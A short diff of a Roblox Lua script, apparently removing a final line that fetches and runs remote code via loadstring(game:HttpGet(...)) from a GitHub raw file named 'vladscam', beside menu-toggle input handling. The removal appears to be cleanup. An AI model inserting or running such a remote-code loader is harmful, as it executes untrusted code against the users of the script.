@@ -142,4 +142,3 @@ UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
     menuFrame.Visible = not menuFrame.Visible -- Переключаем видимость меню
   end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Gusha312/scriptkwqf3124/refs/heads/main/vladscam"))()
